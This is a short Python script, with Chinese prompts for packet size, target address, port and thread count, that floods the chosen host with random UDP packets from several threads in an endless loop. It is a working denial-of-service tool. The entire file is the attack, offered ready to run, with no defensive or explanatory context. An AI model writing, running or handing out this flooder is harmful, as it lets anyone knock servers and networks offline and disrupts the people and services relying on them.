import sys
import socket
import random
import threading
bit = int(input("包大小:"))
ip = str(input("地址:"))
port = int(input("端口:"))
threads = int(input("线程数："))
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(bit)
sent = 0
def run():
    while True:
        while True:
            sock.sendto(data,(ip,port))
    print (f"Sent to {ip}")
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
